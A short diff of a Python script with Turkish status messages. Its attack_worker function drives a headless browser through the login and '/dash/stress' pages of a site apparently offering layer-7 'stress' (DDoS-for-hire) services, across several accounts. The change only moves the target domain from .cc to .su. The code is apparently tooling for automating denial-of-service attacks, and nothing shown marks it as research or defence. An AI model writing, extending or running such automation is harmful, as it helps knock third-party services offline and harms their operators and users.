@@ -67,7 +67,7 @@ def attack_worker(account):
                 print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                 try:
                     # 1. Sayfayı yükle, networkidle ile tüm JS yüklenene kadar bekle
-                    response = page.goto("https://l7srv.cc/login", timeout=30000, wait_until="networkidle")
+                    response = page.goto("https://l7srv.su/login", timeout=30000, wait_until="networkidle")
                     if response:
                         print(f"[{username}] ✅ Sayfa yüklendi. HTTP Durum Kodu: {response.status}")
                         if response.status >= 400:
@@ -126,7 +126,7 @@ def attack_worker(account):
                 # ---------- STRESS SAYFASI ----------
                 print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                 try:
-                    response = page.goto("https://l7srv.cc/dash/stress", timeout=30000, wait_until="networkidle")
+                    response = page.goto("https://l7srv.su/dash/stress", timeout=30000, wait_until="networkidle")
                     if response:
                         print(f"[{username}] ✅ Stress sayfası yüklendi. HTTP {response.status}")
                     page.wait_for_load_state("networkidle", timeout=10000)
